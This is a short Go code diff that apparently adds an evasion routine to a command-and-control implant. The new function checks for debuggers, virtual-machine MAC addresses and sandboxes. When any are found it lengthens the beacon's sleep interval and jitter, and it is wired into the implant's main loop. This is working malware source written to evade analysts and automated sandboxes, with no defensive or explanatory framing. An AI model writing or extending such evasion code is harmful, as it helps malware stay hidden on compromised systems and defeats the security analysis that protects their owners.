@@ -1727,6 +1727,21 @@ func calculateJitteredSleep(baseSleep time.Duration, minJitterPercentage, maxJit
 	return jitteredSleep
 }
 
+func adjustStealthParameters(lazyconf LazyDataType, baseSleep *time.Duration, maxJitter *float64) {
+	if checkDebuggers(lazyconf) || isVMByMAC() || isSandboxEnvironment(lazyconf) {
+		// High detection risk: Increase sleep and jitter significantly
+		*baseSleep = SLEEP * 5
+		*maxJitter = 0.8
+		if lazyconf.DebugImplant == "True" {
+			fmt.Println("[EVASION] High detection risk! Increasing sleep and jitter.")
+		}
+	} else {
+		// Standard parameters
+		*baseSleep = SLEEP
+		*maxJitter = 0.3
+	}
+}
+
 func main() {
     defer globalRecover()
 	mathrand.Seed(time.Now().UnixNano())
@@ -1768,6 +1783,8 @@ func main() {
         func() {        
             defer globalRecover()
             
+            adjustStealthParameters(lazyconf, &baseSleepTime, &maxJitterPercentage)
+
             ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
             defer cancel()
 
